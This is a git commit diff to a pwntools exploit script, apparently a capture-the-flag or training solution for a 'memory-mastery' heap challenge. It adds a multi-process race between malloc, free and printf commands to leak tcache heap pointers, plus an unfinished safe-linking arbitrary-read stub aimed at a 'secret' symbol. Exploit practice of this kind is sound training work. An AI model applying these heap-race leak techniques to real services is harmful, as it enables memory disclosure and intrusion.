19c8bb34374aaf35f4e01e4bdbcae0a110d65fdb
kristianvaleriev <kristianvaleriev237@gmail.com>
2026-09-07 10:55:31 +0300

    Progress

--- memory-mastery/level1-0/solve.py
+++ memory-mastery/level1-0/solve.py
@@ -8,10 +8,17 @@ import pwn as p
 
 
 SCANF_INPUT_SIZE = 1024
+HEAP_FIRST_OFF   = 0xf30
+
+DATA_PREFIX = b"MESSAGE: "
+DATA_PREFIX_LEN = len(DATA_PREFIX)
+
+TRIES = 10000
 
 p.context.arch = 'amd64'
 args = None
 proc, elf, libc = (None, None, None)
+pids = []
 
 
 def get_server():
@@ -44,44 +51,50 @@ class thread_comm(p.remote):
         if proc is None:
             print("!WARNING! Proc isn't started.")
         super().__init__(host, port)
+        self.own_payload = b""
 
 
-    def prompt_cmd(self, cmd):
+    def prompt_cmd(self, cmd, do_send=True):
         if len(cmd) > SCANF_INPUT_SIZE:
             print("!WARNING! Length of cmd is larger than input max size.")
             cmd = cmd[:SCANF_INPUT_SIZE]
         if isinstance(cmd, str):
             cmd = cmd.encode()
 
-        self.clean()
-        self.sendline(cmd)
+        if do_send:
+            self.sendline(cmd)
+        else:
+            self.own_payload += cmd + b' '
+
+
+    def get_payload(self):
+        ret = self.own_payload[:-1]
+        self.own_payload = b""
+        return ret
 
 
     def send_idx(self, idx):
         self.sendline(str(idx).encode())
 
 
-    def printf(self, idx: int):
-        self.prompt_cmd("printf")
-        self.send_idx(idx)
-        self.recvuntil(b"MESSAGE: ")
-        return self.recvline(drop=True)
+    def printf(self, idx: bytes, do_recv=True):
+        self.sendline(b"printf " + idx)
+        if do_recv:
+            self.recvuntil(DATA_PREFIX)
+            return self.recvline(drop=True)
 
 
-    def malloc(self, idx: int):
-        self.prompt_cmd(b"malloc")
-        self.send_idx(idx)
+    def malloc(self, idx: bytes, do_send=False):
+        self.prompt_cmd(b"malloc " + idx, do_send)
 
 
-    def scanf(self, idx: int, msg):
-        self.prompt_cmd(b"scanf")
-        self.send_idx(idx)
-        self.prompt_cmd(msg)
+    def scanf(self, idx: bytes, msg, do_send=False):
+        cmd = b"scanf " + idx + b' ' + msg
+        self.prompt_cmd(cmd, do_send)
 
 
-    def free(self, idx):
-        self.prompt_cmd(b"free")
-        self.send_idx(idx)
+    def free(self, idx: bytes, do_send=False):
+        self.prompt_cmd(b"free " + idx, do_send)
 
 
     def send_flag(self):
@@ -91,16 +104,76 @@ class thread_comm(p.remote):
         return b""
 
 
+def make_workers(num: int, fn, *args):
+    for i in range(num):
+        pid = os.fork()
+        if not pid:
+            for _ in range(TRIES):
+                fn(*args)
+            sys.exit(0)
+        pids.append(pid)
+
+
+def to_addr(b: bytes):
+    return p.u64(b[:8].ljust(8, b'\x00'))
+
+
+def fix_idx(idx):
+    return idx if isinstance(idx, bytes) else str(idx).encode()
+
+
 # We malloc, scanf 16 random bytes to buffer and then race:
-# thd1: strlen(buf) => returns 8 bytes
+# thd1: strlen(buf) => returns 16 bytes
 # thd2: free(buf)   => get metadata into buf
 # thd1: write(1, buf, stlren) => syscall writing out the metadata
-def tcache_leak(th1: thread_comm, thd2: thread_comm):
-    pass
+def tcache_leak(thd1: thread_comm, thd2: thread_comm):
+    scanf_bytes = p.cyclic(16)
+    thd1.malloc(b'0')
+    thd1.scanf(b'0', scanf_bytes)
+    thd1.free(b'0')
+    make_workers(1, thd1.sendline, thd1.get_payload())
+
+    for _ in range(TRIES):
+        thd2.printf(b'0', do_recv=False)
+
+    results = set(thd2.clean().splitlines())
+    print(results)
+    for res in results:
+        ret = res[DATA_PREFIX_LEN:]
+        if len(ret) == 16 and ret != scanf_bytes:
+            return to_addr(ret)
+
+    return 0
+
+
+def get_tcache_leak():
+    thd1 = thread_comm()
+    thd2 = thread_comm()
+
+    for _ in range(TRIES):
+        tcache_addr = tcache_leak(thd1, thd2)
+        if tcache_addr:
+            break
+    return tcache_addr
+
+
+def arbitrary_read(target_addr: int, tcache_addr_leak: int):
+    target_addr = target_addr ^ (tcache_addr_leak)
+    print("target_addr (mangled):: " + hex(target_addr))
+
+
+    return b''
 
 
 def exploit():
-    pass
+    tcache_addr = get_tcache_leak()
+    if not tcache_addr:
+        print("No leak...")
+        return
+    print("tcache_addr:: " + hex(tcache_addr))
+
+    secret = arbitrary_read(elf.symbols['secret'], tcache_addr)
+    print("Leaked secret:", secret)
 
 
 def main():
@@ -110,13 +183,14 @@ def main():
     parser.add_argument('-p', "--pwndbg",   action='store_true')
     parser.add_argument('-n', "--noaslr", action='store_true')
     parser.add_argument('-l', "--log-level", default='info', type=str)
-    args = parser.parse_args()
 
+    global args
+    args = parser.parse_args()
     p.context.log_level = args.log_level
 
     get_server()
-
     exploit()
+
     proc.interactive()
 
 
